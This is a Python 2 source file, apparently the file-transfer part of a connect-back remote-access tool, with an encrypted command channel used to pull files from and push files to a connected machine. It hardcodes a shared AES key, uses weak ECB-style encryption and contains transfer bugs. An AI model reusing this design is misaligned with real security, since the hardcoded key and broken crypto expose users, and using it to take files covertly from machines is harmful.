# for server
class Client:

    import os
    import time
    import socket
    import time
    from Crypto.Cipher import AES
    import base64


    # the block size for the cipher object; must be 16 per FIPS-197
    BLOCK_SIZE = 16
    PADDING = '{'
    secret = 'gemzpFUL^6Gak^QbqDDJbgf~baMp<*h7'
    cipher = AES.new(secret)
    interval = 0.8

    def __init__(self, connection):
        self.encryption = True
        self.sock = connection

    def pad(self, s):
        return s + (self.BLOCK_SIZE - len(s) % self.BLOCK_SIZE) * self.PADDING

    # encodes a AES-encrypted string with base64
    def encodeAES(self, s):
        return self.base64.b64encode(self.cipher.encrypt(self.pad(s)))

    # decrypts a base64-encoded string with AES
    def decodeAES(self, e):
        return self.cipher.decrypt(self.base64.b64decode(e)).rstrip(self.PADDING)

    # send data to the client
    def send(self, cmd, end="EOFEOFEOFEOFEOFX"):
        if self.encryption:
            # encrypts the data and sends it
            self.sock.sendall(self.encodeAES(cmd + end))
        else:
            # sends the clear text data
            self.sock.sendall(cmd + end)

    # receive data from the client
    def receive(self, end='EOFEOFEOFEOFEOFX'):
        data = ''
        # receive data
        encrypted = self.sock.recv(1024)
        while (encrypted):
            if self.encryption:
                # decrypt data
                decrypted = self.decodeAES(encrypted)
            else:
                decrypted = encrypted
            data += decrypted
            if data.endswith(end):
                # end of the incoming data
                break
            else:
                # receive more data
                encrypted = self.sock.recv(1024)
        return data[: -len(end)]

    # download file from client
    def download(self, remote_filename, local_filename=None):
        # checking the params
        if not local_filename:
            local_filename = remote_filename
        try:
            # open file
            f = open(local_filename, 'wb')
        except IOError:
            # error message
            print 'Error opening ' + local_filename + '!\n'
            self.send('cd .')
            return
        # sending the download command
        self.send('download ' + remote_filename)
        fileSize = self.receive()
        print "[*] File size: " + fileSize
        # printing download message
        print '[*] Downloading: ' + remote_filename + ' > ' + local_filename
        self.time.sleep(self.interval)
        # receive file data
        fileSize = self.receive()
        fileData = self.receive()
        # print the file size
        # roundedFileData = round(int(fileSize)/1000000, 2)
        # print '[*] File size: ' + str(roundedFileData) + 'MB = ' + str(fileSize) + 'B'
        self.time.sleep(self.interval)
        # write data into file
        f.write(fileData)
        self.time.sleep(self.interval)
        f.close()

    # upload file to client
    def upload(self, local_filename, remote_filename=None):
        # check if file exists
        if not remote_filename:
            remote_filename = local_filename
        try:
            f = open(local_filename, 'rb')
        except IOError:
            print 'Error opening ' + local_filename + '!\n'
        # start file transfer
        self.send('upload ' + remote_filename)
        print 'Uploading ' + remote_filename + ' > ' + local_filename
        fileSize = self.os.path.getsize(remote_filename)
        roundedFileData = round(fileSize / 1000000, 2)
        print 'File size: ' + str(roundedFileData) + 'MB = ' + str(fileSize) + 'B'
        while True:
            fileData = f.read(1024)
            if not fileData:
                break
            self.send(fileData, '')
        f.close()
        self.send('')
        self.time.sleep(self.interval)


# for client
class Server:

    import os
    import time
    import socket
    import time
    import subprocess
    from Crypto.Cipher import AES
    import base64

    # the block size for the cipher object; must be 16 per FIPS-197
    BLOCK_SIZE = 16
    PADDING = '{'
    secret = 'gemzpFUL^6Gak^QbqDDJbgf~baMp<*h7'
    cipher = AES.new(secret)
    interval = 0.8
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __init__(self, ip_address, port):
        self.encryption = True
        self.server_ip = ip_address
        self.port = port

    def connect(self):
        self.server.connect((self.server_ip, self.port))

    def pad(self, s):
        return s + (self.BLOCK_SIZE - len(s) % self.BLOCK_SIZE) * self.PADDING

    # encodes a AES-encrypted string with base64
    def encodeAES(self, s):
        return self.base64.b64encode(self.cipher.encrypt(self.pad(s)))

    # decrypts a base64-encoded string with AES
    def decodeAES(self, e):
        return self.cipher.decrypt(self.base64.b64decode(e)).rstrip(self.PADDING)

    # send data to the server
    def send(self, cmd, end="EOFEOFEOFEOFEOFX"):
        if self.encryption:
            # encrypts the data and sends it
            self.server.sendall(self.encodeAES(cmd + end))
        else:
            # sends the clear text data
            self.server.sendall(cmd + end)

    # receive data from the server
    def receive(self, end='EOFEOFEOFEOFEOFX'):
        data = ''
        # receive data
        encrypted = self.server.recv(1024)
        while (encrypted):
            if self.encryption:
                # decrypt data
                decrypted = self.decodeAES(encrypted)
            else:
                decrypted = encrypted
            data += decrypted
            if data.endswith(end):
                # end of the incoming data
                break
            else:
                # receive more data
                encrypted = self.server.recv(1024)
        return data[: -len(end)]

    # upload file to server
    def upload(self, filename):
        if True:
            # get size of the file and send
            self.send(str(self.os.path.getsize(filename)))
            # open file
            f = open(filename, 'rb')
            while True:
                # read a part of the file
                fileData = f.readline(512)
                if fileData == '':
                    # send the end
                    self.send('EOFEOFEOFEOFEOFX')
                    # close file
                    f.close()
                    break
                else:
                    # send file data
                    print fileData
                    self.send(fileData, '')
        # except:
        #     self.time.sleep(0.1)
        self.time.sleep(self.interval)
        # send output data
        self.send('Finished download.\n')

    # download file from server
    def download(self, filename):
        # open file
        f = open(filename, 'wb')
        # download file
        fileData = self.receive()
        self.time.sleep(self.interval)
        f.write(fileData)
        # close file
        f.close()
        self.send('Finished upload.')
